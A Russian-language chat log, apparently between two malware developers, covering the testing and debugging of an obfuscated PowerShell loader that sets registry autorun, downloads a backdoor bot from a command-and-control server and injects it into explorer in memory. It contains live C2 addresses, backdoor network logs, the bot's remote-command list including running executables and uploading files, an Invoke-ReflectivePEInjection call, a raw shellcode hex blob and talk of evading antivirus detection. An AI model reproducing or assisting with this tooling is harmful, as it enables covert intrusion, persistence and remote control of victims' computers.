2020-07-10T14:35:28 mushroom -> steller
Привет. Напомни обфусцированный загрузчик это persist-loader.obf.ps1?

2020-07-10T14:36:26 mushroom -> steller
Текущая версия что делает? Загружает чего нибудь, как понять что он отработвл?

2020-07-10T14:38:51 steller -> mushroom
привет. да, он самый.
с прошлого твоего теста изменений не было. так же загружает тестовый dll с сообщением

2020-07-10T14:39:09 mushroom -> steller
OK.

2020-07-31T11:31:08 steller -> mushroom
привет. 
вопрос тебе по поводу winapiproxies.
у тебя в winapiproxy.h
static Kernel32Proxy kernel32;
а не
extern Kernel32Proxy kernel32;
т.е. дубликаты при линковке.
ты так делал с какой-то определенной целью, почистить детекты ?

2020-07-31T11:37:11 mushroom -> steller
привет. 
вопрос тебе по поводу winapiproxies.
у тебя в winapiproxy.h
static Kernel32Proxy kernel32;
а не
extern Kernel32Proxy kernel32;
т.е. дубликаты при линковке.
ты так делал с какой-то определенной целью, почистить детекты ?

2020-07-31T13:30:15 steller -> mushroom
привет. 
вопрос тебе по поводу winapiproxies.
у тебя в winapiproxy.h
static Kernel32Proxy kernel32;
а не
extern Kernel32Proxy kernel32;
т.е. дубликаты при линковке.
ты так делал с какой-то определенной целью, почистить детекты ?

2020-07-31T13:32:23 mushroom -> steller
Это ошибка, если в программе какой нибудь много включать это будет лишний размер. Я везде у себя делаю extern.

2020-07-31T13:32:47 mushroom -> steller
Это просто как тестовая программа сделал там static.

2020-07-31T13:33:42 steller -> mushroom
ага.)
решил функций добавить и сократить код и натолкнулся

2020-07-31T13:34:03 mushroom -> steller
Как уловка с целью сбить с толку может и прокатит, я не пробовал.

2020-07-31T13:37:57 mushroom -> steller
А там есть сброс хуков в winapiproxy?

2020-07-31T13:40:41 mushroom -> steller
Вот по новее:
Download: https://qaz.im/load/GEGeBH/n7rSZd   
Delete: https://qaz.im/index.php?a=delete&q=2023868546
Пароль: 123

2020-07-31T13:40:51 steller -> mushroom
похоже, нет

2020-07-31T13:41:18 mushroom -> steller
Там есть, что я выслал. В репозиторий давно не коммитил.

2020-07-31T13:45:18 steller -> mushroom
я придумал как код сильно ужать, чтобы запарно не добавлять функции:

    typedef decltype(StrToInt64ExA) *PStrToInt64ExA;
    PStrStrA StrStrA()
    {
      return PStrStrA(getProcAddress(_STR("StrStrA")));
    }
вызываем StrStrA()(....)

2020-07-31T13:52:24 mushroom -> steller
Надо попробовать.

2020-08-03T11:54:31 mushroom -> steller
Привет persist-loader.obf.ps1 что делает сейчас? Должен показывать окно как раньше? Или он уже бэкдор загружает и запускает?

2020-08-03T11:55:57 mushroom -> steller
Я запустил, он отработал, в реестр добавился на автозапуск.

2020-08-03T11:56:04 mushroom -> steller
Окна не было.

2020-08-03T12:01:31 steller -> mushroom
Привет.
Зависит от того, что на серваке загружено.
У теябя есть доступ?

2020-08-03T12:02:04 mushroom -> steller
https://scrytnuuszglaugg.onion сюда?

2020-08-03T12:03:15 steller -> mushroom
Да, именно к ботам.

2020-08-03T12:03:55 mushroom -> steller
Есть. У меня доступ к группам 1, 2, two, seven, 8

2020-08-03T12:06:06 steller -> mushroom
А этот загрузчик four загружает. Там в коде ложно быть прописано.

2020-08-03T12:06:28 mushroom -> steller
Что там сейчас?

2020-08-03T12:07:38 steller -> mushroom
Там рабочий бот загружен, который команды выполняет.

2020-08-03T12:08:03 mushroom -> steller
Как его выключить?

2020-08-03T12:08:23 mushroom -> steller
Работает он сейчас?

2020-08-03T12:09:15 steller -> mushroom
Посмотри в истории несколько команд лежат:
https://51.89.125.28:12280/bots/command?id=ed17f68af885a2b91a416e9f2a19389a

2020-08-03T12:09:45 mushroom -> steller
Он на тестовом сервере значит работает.

2020-08-03T12:10:23 steller -> mushroom
Да, наверно. 12280 тестовый?

2020-08-03T12:10:31 mushroom -> steller
Да.

2020-08-03T12:11:02 steller -> mushroom
Он должен  иньектиться в explorer, насколько я помню

2020-08-03T12:11:20 mushroom -> steller
Значит он не отработал.

2020-08-03T12:11:36 mushroom -> steller
Последняя команда 20.07.2020

2020-08-03T12:11:48 mushroom -> steller
А я только что запускал у себя загрузчик.

2020-08-03T12:12:01 steller -> mushroom
Сейчас попробую у себя.

2020-08-03T12:12:39 mushroom -> steller
Группа four там да?

2020-08-03T12:12:55 mushroom -> steller
Я попрошу доступ к ней.

2020-08-03T12:12:58 steller -> mushroom
Ага

2020-08-03T12:14:11 mushroom -> steller
С моего компьютера другой id будет, а не ed17f68af885a2b91a416e9f2a19389a

2020-08-03T12:14:39 mushroom -> steller
Там есть бот, который был последний раз онлайн сегодня?

2020-08-03T12:16:58 steller -> mushroom
У тебя https://51.89.125.28:12280/bots открывается?
Там статус ботов есть.

2020-08-03T12:19:24 mushroom -> steller
У меня доступа к группе four нету.

2020-08-03T12:19:38 mushroom -> steller
По этому я её не вижу.

2020-08-03T12:20:17 steller -> mushroom
Пока боты не подключались

2020-08-03T12:20:38 mushroom -> steller
Давай. Я запускаю сейчас. Посмотри.

2020-08-03T12:22:05 mushroom -> steller
Висит пока. Типа скачивает?

2020-08-03T12:22:20 mushroom -> steller
Или завис.

2020-08-03T12:22:36 steller -> mushroom
Дождись, там таймаут д.б.

2020-08-03T12:23:04 mushroom -> steller
Исключение при вызове "GetResponse" с "0" аргументами: "Время ожидания операции истекло"

2020-08-03T12:23:15 mushroom -> steller
В реестр добавился.

2020-08-03T12:23:24 steller -> mushroom
У меня тоже не подключается. В последний раз работало, хотя ничего не менял

2020-08-03T12:24:32 mushroom -> steller
А через браузер файл скачивается?

2020-08-03T12:24:43 mushroom -> steller
Может на сервере глюк.

2020-08-03T12:33:20 steller -> mushroom
Скрипт скачивает бота норм.

2020-08-03T12:34:14 steller -> mushroom
У тебя openvpn работает?

2020-08-03T12:34:27 mushroom -> steller
Нет.

2020-08-03T12:34:50 steller -> mushroom
А как ты без него тестишь?

2020-08-03T12:35:29 mushroom -> steller
Просто запускаю.

2020-08-03T12:35:48 steller -> mushroom
На виртуалке?

2020-08-03T12:36:14 mushroom -> steller
Не прямо со своего компьютера.

2020-08-03T12:36:37 mushroom -> steller
Опять запустил, бот не появился.

2020-08-03T12:36:56 mushroom -> steller
Мне дали доступ к группе four, теперь могу смотреть.

2020-08-03T12:37:00 steller -> mushroom
Ну, у меня нормально напрямую скачивается. Настрою openvpn получше потестирую

2020-08-03T12:37:31 mushroom -> steller
Может у меня старая версия загрузчика?

2020-08-03T12:37:41 mushroom -> steller
Я pull делал.

2020-08-03T12:37:44 steller -> mushroom
Попробуй еще на виртуалку закинуть, может только у тебя не скачивается?

2020-08-03T12:40:34 steller -> mushroom
persist-loader.obf.ps1
Dowload URL:
https://file.io/aS2AElyA0i9Y
Pass:
$%7TUQn{oCX-zFB)|Xu^

2020-08-03T12:42:16 mushroom -> steller
В GitLab устаревший?

2020-08-03T12:48:16 steller -> mushroom
Этот новый. Работает?

2020-08-03T12:48:32 mushroom -> steller
Жду пока завершиться.

2020-08-03T12:48:45 mushroom -> steller
В виртуалке Win 7 исключение вылезло.

2020-08-03T12:49:14 steller -> mushroom
Сейчас тоже на виртуалке попробую

2020-08-03T12:49:27 mushroom -> steller
Index operation failed; the array index evaluated to null.
At C:\Users\TestUser\Downloads\persist-loader.obf.ps1:2362 char:66
+ ${P`ATh} = (${DOw`NloA`D_P`Ath_`X86}, ${dow`N`l`oAd_P`A`TH_X64})[ <<<<  (&("{0}{2}{1}"-f'ChI','itEM','Ld')  ("Va"+"rI
ABLe:SF6r"+"mB")  )."V`Alue"::"Is64B`ITOPerAT`i`NG`Syst`Em"]
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : NullArrayIndex

2020-08-03T12:49:39 mushroom -> steller
Это Win 7.

2020-08-03T12:49:59 mushroom -> steller
Win 10 не виртуалка до сих пор работает.

2020-08-03T12:51:47 steller -> mushroom
А версия powershell какая?

2020-08-03T12:52:10 mushroom -> steller
На Win 7 или Win 10?

2020-08-03T12:52:27 steller -> mushroom
С исключением

2020-08-03T12:52:43 mushroom -> steller
Сейчас.

2020-08-03T12:53:33 mushroom -> steller
2.0

2020-08-03T12:53:47 mushroom -> steller
На Win 10 5.1.19041.1

2020-08-03T12:54:13 mushroom -> steller
На Win 10 Исключение при вызове "GetResponse" с "0" аргументами: "Время ожидания операции истекло"

2020-08-03T12:54:33 mushroom -> steller
Сейчас Win 10 виртуалку попробую.

2020-08-03T12:56:38 steller -> mushroom
На 2.0 должно работать, но не тестировал.
На 5.1 тестировал.
На 7.0, кажется не работает

2020-08-03T12:57:09 mushroom -> steller
На 7 не работает. Это PowerShell Core.

2020-08-03T12:57:32 mushroom -> steller
На 5.1 у меня Исключение при вызове "GetResponse" с "0" аргументами: "Время ожидания операции истекло"

2020-08-03T12:58:10 steller -> mushroom
Что-то с сетью. Возможно файервол блокирует.

2020-08-03T12:58:28 mushroom -> steller
Запускаю в powershell какой там адрес?

2020-08-03T12:58:37 mushroom -> steller
Я попробую скачать браузером.

2020-08-03T12:59:38 mushroom -> steller
А когда там dll с окном была, всё скачивалось.

2020-08-03T13:01:08 steller -> mushroom
В том то и дело, что поменялось - не понятно.
У меня сейчас скачивается как и раньше

2020-08-03T13:01:54 mushroom -> steller
Win 10 виртуалка отработал быстрее чем на не виртуалке. Но в админке бота не появилось.

2020-08-03T13:02:15 mushroom -> steller
А у тебя бот появляется?

2020-08-03T13:03:23 steller -> mushroom
Давай я openvpn настрою, потом потестирую, хорошо?

2020-08-03T13:03:34 mushroom -> steller
OK.

2020-08-03T14:09:26 steller -> mushroom
Ты здесь? Вот, смотри:
- на 2.0 пока какие-то глюки, скоро на нем потестирую
- на 5.1 все работает.
- на 7.0 не работает иньекция

2020-08-03T14:13:16 mushroom -> steller
ed17f68af885a2b91a416e9f2a19389a вижу онлайн.

2020-08-03T14:37:10 mushroom -> steller
Запустил не обфусцированный вариант:
getting available version...
downloading bot...
download url: http://51.89.125.28:12234/api/v116
bot download success
running injecion...

2020-08-03T14:37:24 mushroom -> steller
Бот не появился.

2020-08-03T14:38:14 mushroom -> steller
Инъекция не прошла получается.

2020-08-03T14:41:01 mushroom -> steller
А куда скачивает dll?

2020-08-03T14:41:14 mushroom -> steller
Чтобы посмотреть её наличие.

2020-08-03T14:43:21 mushroom -> steller
Или никуда не скачивает, с памяти работает?

2020-08-03T14:46:15 steller -> mushroom
Да, прям с памяти - необходимое условие в ТЗ

2020-08-03T14:46:34 mushroom -> steller
На этом шаге running injecion...

2020-08-03T14:46:42 mushroom -> steller
Не работает получается у меня.

2020-08-03T14:47:06 steller -> mushroom
На ps5.1?

2020-08-03T14:47:25 mushroom -> steller
5.1.19041.1

2020-08-03T14:47:32 steller -> mushroom
Eсли до туда дошло, значит скачалось.

2020-08-03T14:48:08 mushroom -> steller
Это понятно.

2020-08-03T14:48:51 steller -> mushroom
У меня на 5.1.14409.1005 работает

2020-08-03T14:49:06 steller -> mushroom
А ошибки сыпит?

2020-08-03T14:49:14 mushroom -> steller
Нет.

2020-08-03T14:49:44 mushroom -> steller
В начале
remove-item : Не удается найти путь "C:\Users\ivana\Projects\persist-loader\persist-loader.ps1.new", так как он не суще
ствует.

2020-08-03T14:49:56 mushroom -> steller
Но это не влияет я думаю.

2020-08-03T14:50:05 mushroom -> steller
Потом всё без ошибок.

2020-08-03T14:50:36 steller -> mushroom
Попробуй оригинальную в отладчике прогнать:
persist-loader.build.ps1
Dowload URL:
https://file.io/2qyPQMTduALp
Pass:
33ja?}_93bkklf7bMTAU

2020-08-03T14:51:02 steller -> mushroom
На неё дефендер будет жаловаться

2020-08-03T14:53:02 steller -> mushroom
там  "x64" нужно заменить на "AMD64"

2020-08-03T14:54:08 mushroom -> steller
В каком файле, какая строка?

2020-08-03T14:55:27 steller -> mushroom
Который выслал. Она там одна.

2020-08-03T14:56:03 steller -> mushroom
С кавычками

2020-08-03T14:56:53 mushroom -> steller
$b.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null

2020-08-03T14:57:09 mushroom -> steller
$Is64Sys = ($env:PROCESSOR_ARCHITECTURE -eq "x64")

2020-08-03T14:57:35 mushroom -> steller
В какой? В обеих?

2020-08-03T15:00:17 steller -> mushroom
Там где двойные

2020-08-03T15:04:52 mushroom -> steller
Прогнал в отладчике. Всё до конца дошло. Defender предложил файл отправить на проверку, я не отправил. Бот не появляется.

2020-08-03T15:06:31 steller -> mushroom
А иньекция прошла?

2020-08-03T15:06:58 mushroom -> steller
А как проверить?

2020-08-03T15:07:22 steller -> mushroom
Ну, посмотри, explorer больше памяти оттяпал.

2020-08-03T15:07:26 mushroom -> steller
Ошибок никаких не вылезло во время выполнения Invoke-ReflectivePEInjection -PEBytes $Bot -ProcId $AttachProcId

2020-08-03T15:07:37 steller -> mushroom
Только его грохать нужно с каждым тестом

2020-08-03T15:08:17 mushroom -> steller
Вроде вырос.

2020-08-03T15:08:24 mushroom -> steller
Сейчас ещё раз посмотрю.

2020-08-03T15:08:54 steller -> mushroom
Возможно, бот не может подключиться

2020-08-03T15:13:37 mushroom -> steller
Проверил. Прыгает размер explorer с 30 до 85 мб, а потом опять до 30.

2020-08-03T15:18:11 mushroom -> steller
А можно сделать логированную версию бота? Чтобы лог писал в файл или в консоль.

2020-08-03T15:18:12 steller -> mushroom
Возможно, бот отваливается. 
А попробуй опять вывести сообщение вместо бота.
выбери в botlegger 	test.dll

2020-08-03T15:18:57 steller -> mushroom
Да, наверно придется сделать, раз не работает

2020-08-03T15:20:40 mushroom -> steller
А ты сам менял там бот на тест?

2020-08-03T15:20:55 mushroom -> steller
Я на кнопку жму и ничего не происходит.

2020-08-03T15:25:00 steller -> mushroom
Раньше работало. Поробую загрузить

2020-08-03T15:26:02 mushroom -> steller
Заменил.

2020-08-03T15:26:10 mushroom -> steller
Я кнопку GO не нажимал.

2020-08-03T15:26:56 steller -> mushroom
Отлично. Сайт просто поменялся

2020-08-03T15:27:24 mushroom -> steller
Окно есть

2020-08-03T15:27:48 mushroom -> steller
Значит это бот где то отваливается.

2020-08-03T15:30:21 steller -> mushroom
Тогда сделаю версию с логами

2020-08-03T15:30:30 mushroom -> steller
Хорошо.

2020-08-03T15:32:42 steller -> mushroom
Если persist-loader будет скачивать polipo для связи через системный прокси нормально будет?

2020-08-03T15:33:54 mushroom -> steller
А что это даст?

2020-08-03T15:35:12 steller -> mushroom
Некоторые системы работают через прокси

2020-08-03T15:35:40 steller -> mushroom
Т.е. через прямое соединение не подключиться

2020-08-03T15:36:09 mushroom -> steller
Это в будущем может быть нужно будет. На данный момент не нужно.

2020-08-03T15:36:38 steller -> mushroom
Ладно. Оставлю пока.

2020-08-04T07:19:18 steller -> mushroom
Привет.
Загрузил на сервер x64 версию с логами. Можно пробовать.

2020-08-04T07:51:48 mushroom -> steller
Привет. Хорошо.

2020-08-04T08:59:22 mushroom -> steller
Лог пишется в файл ещё? В консоль то что пишется не успеваю прочитать, быстро она закрывается.

2020-08-04T09:00:52 steller -> mushroom
Пока в консоль только. Скоро сделаю в файл

2020-08-04T09:01:40 mushroom -> steller
Напиши, когда в файл сделаешь вывод.

2020-08-04T09:02:11 steller -> mushroom
Хорошо

2020-08-04T09:05:35 mushroom -> steller
Ещё заметил что переменные окружения PARENT, PARENTID, VARS устанавливаются глобально для пользователя (постоянно установлены, и после перезагрузки), а не для процесса только.

2020-08-04T09:05:58 mushroom -> steller
Я их постоянно удаляю в настройках системы.

2020-08-04T09:48:08 steller -> mushroom
Посмотрю, как можно исправить.
Слушай, а ты такой генератор использовал?
https://github.com/mdsecactivebreach/SharpShooter

2020-08-04T09:49:56 mushroom -> steller
Нет не использовал.

2020-08-04T09:51:05 steller -> mushroom
Похоже, он разные скрипты генерирует для выполнения ботов, например

2020-08-04T10:01:52 mushroom -> steller
Можно попробовать, когда с этим разберёмся.

2020-08-04T12:17:06 steller -> mushroom
Добавил логи в файл. Можешь запускать

2020-08-04T12:21:08 mushroom -> steller
Попозже запущу.

2020-08-04T12:22:16 steller -> mushroom
В с:\temp

2020-08-04T13:17:38 steller -> mushroom
В с:\temp

2020-08-04T13:19:51 mushroom -> steller
Вот что получил:
04.08.2020 16:19:23 Backdoor build Aug  4 2020 15:08:49
04.08.2020 16:19:23 Getting command...
04.08.2020 16:19:23 Connecting...
04.08.2020 16:19:23 153 bytes of handshake data sent
04.08.2020 16:19:23 1296 bytes of handshake data received
04.08.2020 16:19:23 126 bytes of handshake data sent
04.08.2020 16:19:23 242 bytes of handshake data received
04.08.2020 16:19:23 Handshake was successful
04.08.2020 16:19:23 Security Context of this session valid till Wed Mar 10 13:15:19 2021
 (local time)
04.08.2020 16:19:23 Connection start {1d5f6c4, ccf61580}: 2020/3/10 10:15:19.000 UTC
04.08.2020 16:19:23 Connection expiry {1d71596, 45bcd580}: 2021/3/10 10:15:19.000 UTC
04.08.2020 16:19:23 
04.08.2020 16:19:23 Server subject: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
04.08.2020 16:19:23 Server issuer: C=AU, S=Some-State, O=Internet Widgits Pty Ltd

2020-08-04T13:25:12 steller -> mushroom
Дальше вылет?

2020-08-04T13:25:29 mushroom -> steller
Наверное. Дальше ничего нет.

2020-08-04T13:25:45 steller -> mushroom
Проверю.

2020-08-04T13:32:29 steller -> mushroom
Попробуй еще раз

2020-08-04T13:34:49 mushroom -> steller
04.08.2020 16:19:23 Backdoor build Aug  4 2020 15:08:49
04.08.2020 16:19:23 Getting command...
04.08.2020 16:19:23 Connecting...
04.08.2020 16:19:23 153 bytes of handshake data sent
04.08.2020 16:19:23 1296 bytes of handshake data received
04.08.2020 16:19:23 126 bytes of handshake data sent
04.08.2020 16:19:23 242 bytes of handshake data received
04.08.2020 16:19:23 Handshake was successful
04.08.2020 16:19:23 Security Context of this session valid till Wed Mar 10 13:15:19 2021
 (local time)
04.08.2020 16:19:23 Connection start {1d5f6c4, ccf61580}: 2020/3/10 10:15:19.000 UTC
04.08.2020 16:19:23 Connection expiry {1d71596, 45bcd580}: 2021/3/10 10:15:19.000 UTC
04.08.2020 16:19:23 
04.08.2020 16:19:23 Server subject: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
04.08.2020 16:19:23 Server issuer: C=AU, S=Some-State, O=Internet Widgits Pty Ltd

04.08.2020 16:34:21 Backdoor build Aug  4 2020 16:30:14
04.08.2020 16:34:21 Getting command...
04.08.2020 16:34:21 Connecting...
04.08.2020 16:34:21 153 bytes of handshake data sent
04.08.2020 16:34:21 1296 bytes of handshake data received
04.08.2020 16:34:21 126 bytes of handshake data sent
04.08.2020 16:34:21 242 bytes of handshake data received
04.08.2020 16:34:21 Handshake was successful
04.08.2020 16:34:21 Security Context of this session valid till Wed Mar 10 13:15:19 2021
 (local time)
04.08.2020 16:34:21 Connection start {1d5f6c4, ccf61580}: 2020/3/10 10:15:19.000 UTC
04.08.2020 16:34:21 Connection expiry {1d71596, 45bcd580}: 2021/3/10 10:15:19.000 UTC
04.08.2020 16:34:21 
04.08.2020 16:34:21 Server subject: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
04.08.2020 16:34:21 Server issuer: C=AU, S=Some-State, O=Internet Widgits Pty Ltd

04.08.2020 16:34:21 fix1
04.08.2020 16:34:21 fix2
04.08.2020 16:34:21 fix3

2020-08-04T13:39:57 steller -> mushroom
С выводом сертификатов какая-то проблема. Отключил. Попробуй еще раз.

2020-08-04T13:40:52 mushroom -> steller
Работает.

2020-08-04T13:41:18 steller -> mushroom
👍

2020-08-04T13:41:50 steller -> mushroom
Нелогированную сейчас обновлю

2020-08-04T13:42:15 mushroom -> steller
Оставь пока логированную.

2020-08-04T13:42:25 mushroom -> steller
Проверить все команды.

2020-08-04T13:42:46 steller -> mushroom
Активной оставлю

2020-08-04T13:43:26 steller -> mushroom
У логированной постфикс l, если вдруг захочешь переключить

2020-08-04T13:43:42 mushroom -> steller
OK.

2020-08-04T13:49:24 mushroom -> steller
Там где бот ничего нет.

2020-08-04T13:49:30 mushroom -> steller
Команда pending.

2020-08-04T13:49:43 mushroom -> steller
Бот 6966b29479574d5abb89b8bde1a94a45

2020-08-04T13:55:42 mushroom -> steller
PowerShell cd c:\\r\ndir\r\n тоже не сработало.

2020-08-04T14:07:34 steller -> mushroom
Принял. Сейчас проверю.

2020-08-04T14:13:34 steller -> mushroom
А дальше лог не идет?

2020-08-04T14:13:55 mushroom -> steller
Идёт.

2020-08-04T14:14:10 steller -> mushroom
И что там?

2020-08-04T14:16:22 mushroom -> steller
Download: https://qaz.im/load/BhidDr/DiSk9b
Delete: https://qaz.im/index.php?a=delete&q=2131231937

2020-08-04T14:16:26 mushroom -> steller
Пароль 123

2020-08-04T14:19:41 steller -> mushroom
Какая-то лажа с https. Попробуй http.

2020-08-04T14:20:48 mushroom -> steller
Как? Это же от бота зависит.

2020-08-04T14:21:25 steller -> mushroom
Ну, я его уже загрузил на сервак

2020-08-04T14:21:35 steller -> mushroom
Постфикс h

2020-08-04T14:25:01 steller -> mushroom
А в консольном логе у тебя кодировка нормально отображается?

2020-08-04T14:25:29 mushroom -> steller
Русская нет.

2020-08-04T14:26:13 mushroom -> steller
Вот так русская ╨в╨╛╨╝ ╨▓ ╤Г╤Б╤В╤А╨╛╨╣╤Б╤В╨▓╨╡ C ╨╕╨╝╨╡╨╡╤В ╨╝╨╡╤В╨║╤Г BOOTCAMP
╨б╨╡╤А╨╕╨╣╨╜╤Л╨╣ ╨╜╨╛╨╝╨╡╤А ╤В╨╛╨╝╨░: 0246-9FF7

2020-08-04T14:31:18 mushroom -> steller
bat отработал нормально, получил результат.

2020-08-04T14:33:18 mushroom -> steller
Но для боевого сервера надо https чтобы было.

2020-08-04T14:35:19 steller -> mushroom
Это я проверю на других виртуалках. Локально работает.
Можешь проверить в консоли chcp? Что-то с кодировкой не то

2020-08-04T14:36:15 mushroom -> steller
PowerShell отработал, но там крякозябры вместо русских слов пришли.

2020-08-04T14:36:40 mushroom -> steller
866

2020-08-04T14:36:45 mushroom -> steller
Стандартная.

2020-08-04T14:37:09 mushroom -> steller
А Bat нормальные русские слова пришли.

2020-08-04T14:37:19 steller -> mushroom
А в логах от ps есть они?

2020-08-04T14:37:48 mushroom -> steller
Вот что пришло:
Љ в «®Ј: C:\


Mode LastWriteTime Length Name
---- ------------- ------ ----
d-----
29.05.2020 11:20 AMD
d----- 24.07.2020 13:21 LLVM
d----- 07.12.2019 12:14 PerfLogs

d-r--- 31.07.2020 15:35 Program Files
d-r--- 15.07.2020 12:05 Program Files (x86)

d----- 27.05.2020 13:55 Qt
d----- 04.08.2020 17:23 temp
d-r--- 29.05.2020 19:44
Users
d----- 17.07.2020 18:54 Windows
-a---- 14.12.2019 16:22 170 AppleBcInstaller.log

-a---- 28.01.2020 18:49 5131674 england-cumbria-kelly-hall-tarn.jpg
-a---- 07.10.2019 17:41 17579 MailServerConfig.xml

2020-08-04T14:38:11 steller -> mushroom
Это я вижу, а в логах у тебя локально есть они?

2020-08-04T14:38:49 mushroom -> steller
Вот для команды лог:
body:
YFБдJGetting command...
request headers:
GET /6966b29479574d5abb89b8bde1a94a45/2 HTTP/1.0
Host: 51.89.125.28
cookie: group=four
Connection: Close

HTTP header size: 166HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: application/json; charset=UTF-8
Content-Length: 23
Connection: close
Date: 14:34:02
Vary: Accept

body:
XUТеYa}z╢Г█┘┴╩p↓dl╓¤♂ZGCmd received: 13 1 60
cd c:\
dir

cd c:\
dir


Sleep before getting new command for 300s...
TShell::Read(StdOut) CP_ACP:


    Каталог: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        29.05.2020     11:20                AMD
d-----        24.07.2020     13:21                LLVM
d-----        07.12.2019     12:14                PerfLogs
d-r---        31.07.2020     15:35                Program Files
d-r---        15.07.2020     12:05                Program Files (x86)
TShell::Read(StdErr) CP_ACP: 13:55                Qt

Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Read timeout
Posting command result...
request headers:
POST /6966b29479574d5abb89b8bde1a94a45/3 HTTP/1.0
Host: 51.89.125.28
Content-Type: text/plain; charset=UTF-8
Content-Length:1778
Connection: Close

HTTP header size: 165HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: application/json; charset=UTF-8
Content-Length: 5
Connection: close
Date: 14:35:04
Vary: Accept

body:
YFБдJ

2020-08-04T14:39:57 mushroom -> steller
Ты в UTF-8 переводишь всё что посылаешь?

2020-08-04T14:41:17 steller -> mushroom
Да, конечно.

2020-08-04T14:42:08 steller -> mushroom
Смотрю, CP_OEMCP для bat не выбирается.

2020-08-04T14:50:54 mushroom -> steller
Смотри:
body:
XFДдCmd received: 1 60
Sleep before getting new command for 300s...

2020-08-04T14:51:01 mushroom -> steller
Так и должно быть?

2020-08-04T14:51:18 mushroom -> steller
Это команда информация о системе.

2020-08-04T14:51:41 mushroom -> steller
Никакого лога что она выполняется нету.

2020-08-04T14:53:26 steller -> mushroom
А что там в оригинале?

2020-08-04T14:54:08 mushroom -> steller
В смысле в логе?

2020-08-04T14:54:56 mushroom -> steller
Не выполнилась, через 5 минут опять команду запросил бот. Получается команда 1 так и висит pending.

2020-08-04T14:55:24 steller -> mushroom
А, эта команда не реализована.

Из ТЗ:

Коды команды и параметры:

0 NOP %time% - нет операции. Время - число секунд, на которое должен заснуть бот
 до следующего отстука на сервер.
УСТАРЕЛО, не реализовывать! информация о системе будет получаться путем запуска .cmd-скрипта.
1 %time% Получить информацию о системе. Время - число секунд, на которое должен заснуть бот
 до следующего отстука на сервер.

2020-08-04T14:55:24 mushroom -> steller
Вот лог:
body:
YFБдJGetting command...
request headers:
GET /6966b29479574d5abb89b8bde1a94a45/2 HTTP/1.0
Host: 51.89.125.28
cookie: group=four
Connection: Close

HTTP header size: 165HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: application/json; charset=UTF-8
Content-Length: 4
Connection: close
Date: 14:49:18
Vary: Accept

body:
XFДдCmd received: 1 60
Sleep before getting new command for 300s...
Getting command...
request headers:
GET /6966b29479574d5abb89b8bde1a94a45/2 HTTP/1.0
Host: 51.89.125.28
cookie: group=four
Connection: Close

HTTP header size: 165HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Content-Type: application/json; charset=UTF-8
Content-Length: 5
Connection: close
Date: 14:54:19
Vary: Accept

body:
YFБдKCmd received: 0 302
Sleep before getting new command for 302s...

2020-08-04T14:56:26 mushroom -> steller
Тогда делаю reset.

2020-08-04T14:57:05 mushroom -> steller
Шелл код команда работает?

2020-08-04T14:58:37 steller -> mushroom
Что-то не вижу на серваке такой.

2020-08-04T14:59:09 mushroom -> steller
Run code называется.

2020-08-04T15:00:14 mushroom -> steller
Она есть у тебя? Эта команда может прибить бот если она не в SEH.

2020-08-04T15:00:32 mushroom -> steller
Если этот шелл код плохо сделан.

2020-08-04T15:01:26 steller -> mushroom
В ТЗ нету

2020-08-04T15:01:32 mushroom -> steller
Например такой:
33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 6C 8B CC 57 57 51 57 FF D0

2020-08-04T15:01:59 mushroom -> steller
А какие команды у тебя в ТЗ? У меня значит другое ТЗ для бота.

2020-08-04T15:02:34 steller -> mushroom
enum class TCmd
{
  Nop = 0,
  RunExe = 10,
  RunDll = 11,
  RunBat = 12,
  RunPs = 13,
  Reset = 14,
  Terminate = 15,
  UploadToServer = 16,
  Remove = 100
};

2020-08-04T15:03:33 steller -> mushroom
Ты же раньше делал, поэтому у меня с изменениями, видимо.

2020-08-04T15:03:43 mushroom -> steller
Да.

2020-08-04T15:05:16 mushroom -> steller
Команда remove удалит из реестра загрузчик?

2020-08-04T15:05:41 mushroom -> steller
Или только файл? Или и то и то?

2020-08-04T15:11:24 steller -> mushroom
Просто завершается.
Из ТЗ:
* пункты со звездочкой: предполагается, что бот будет НЕрезидентным,
т.е. НЕ будет закрепляться в системе.
Потому все что касается резидентности (закрепление, обновление, удаление)
в первой версии делать НЕ НУЖНО.
Однако заглушки остаются и в замысел закладывается то, что отдельные (точечные)
исполнения могут быть резидентными и данные функции поддерживать.

2020-08-04T15:12:29 mushroom -> steller
OK.

2020-08-04T15:13:07 steller -> mushroom
Скорее всего должен завершиться explorer и перезагрузиться. Попробуй, может уу тебя по-другому

2020-08-04T15:22:03 mushroom -> steller
А загрузчик резидентный получается?

2020-08-04T15:22:20 mushroom -> steller
Как его удалить?

2020-08-04T15:23:44 mushroom -> steller
Про удаление загрузчик у тебя в ТЗ ничего нет?

2020-08-04T15:26:55 steller -> mushroom
Да, загрузчик постоянно торчит в системе. Ничего больше не удаляется

2020-08-04T15:28:27 mushroom -> steller
Понял.

2020-08-04T15:38:39 steller -> mushroom
Ладно, давай до завтра.

2020-08-04T15:38:55 mushroom -> steller
Давай.

